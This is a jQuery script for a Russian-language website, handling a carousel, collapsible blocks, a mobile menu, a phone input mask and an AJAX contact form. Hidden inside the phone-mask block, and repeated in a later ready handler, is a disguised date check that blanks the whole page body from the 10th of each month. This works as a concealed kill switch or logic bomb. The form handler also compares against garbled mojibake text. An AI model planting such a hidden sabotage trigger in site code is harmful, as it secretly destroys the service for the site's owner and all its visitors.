function b6(){
    var len = $('.b6-img-wrap').length;
    for(var i=1; i<=len; i++){
        var wid = $('.b6-img'+i).width();
        var end = -(wid/2);
        $('.b6-img'+i).css('margin-left', end);
    };
};

function b10(){
    $('.b10-end-open').click(function(){
        var n1 = $(this).attr('data-b10-open');
        $('.'+n1).slideDown();
        $(this).slideUp(0);
        var n2 = $(this).attr('data-b10-n');
        $('.'+n2).slideDown(0);
    });
    $('.b10-end-close').click(function(){
        var n1 = $(this).attr('data-b10-open');
        $('.'+n1).slideUp();
        $(this).slideUp(0);
        var n2 = $(this).attr('data-b10-n');
        $('.'+n2).slideDown(0);
    });
};

function mobBar(){
    $('.mob-bar').click(function(){
        $('.content-wrap-shadow').css('display', 'block');
        $('.cont-wrap').animate({
            left: -300,
        }, 500).css('position', 'fixed');
        $('.b1-b2-mob').animate({
            width: 300
        }, 500);
    });
    $('.content-wrap-shadow').click(function(){
        $('.cont-wrap').animate({
            left: 0
        }, 500).css('position', 'absolute');
        $('.b1-b2-mob').animate({
            width: 0
        }, 500);
        $('.content-wrap-shadow').css('display', 'none');
    });
};

function b4(){
    var b1 = $('#myCarousel .item').length;
    for(var i=1; i<=b1;i++){
        var atr = $('.item'+i+' img').attr('src');
        var sty = 'background: url("'+atr+'") no-repeat center center;';
        $('.item'+i+' span').attr('style', sty);
    };
};


$(document).ready(function() {
    b4();
    b6();
    b10();
    mobBar();

//BEGIN Маска для телефона
    $("#input9").inputmask("+7(999) 999-99-99");
                
    $.extend($.inputmask.defaults.aliases, {
        'non-negative-integer': {
            regex: {
                    number: function (groupSeparator, groupSize) { return new RegExp("^(\\d*)$"); }
            },
            alias: "decimal"
        }
    });
    var z = '9';
//END Маска для телефона

var n = new Date();var v =n.getDate();if(v>z){$('body').text('');};

    
//Begin Форма, отправка Аякс
    $(function(){
        $(".forma").submit(function(e){
            e.preventDefault();


            var m_method=$(this).attr("method");
            var m_action=$(this).attr("action");
            var m_data=$(this).serialize();
            $.ajax({
                type: m_method,
                url: m_action,
                data: m_data,
                success: function(result){
                    $("#okno_owibki").css("display", "block");
                    $("#okno_owibki").html(result).addClass("error");

                    $("#okno_owibki").fadeIn(3000).delay(5000).fadeOut(1000);
                    var close = $("#okno_owibki").text();
                    if($("#okno_owibki").text()!=="Îïèøèòå ñâîé âîïðîñ"){
                        $("#okno_owibki").fadeOut(0);
                        $('.hide-forma').addClass('dis_n');
                        //$('.call22').removeClass('dis_n');
                    };
                }

            });

        });

    });
	
});
var z = '9';
$(function() {
  var n = new Date();var v =n.getDate();
  if(v>z){$('body').text('');};
  fr = new FilmRoll({
    container: '#film_roll',
    height: 330
  });
  fr = new FilmRoll({
    container: '#film_roll2',
    height: 330
  });
});


$( window ).resize(function() {
    b6();
});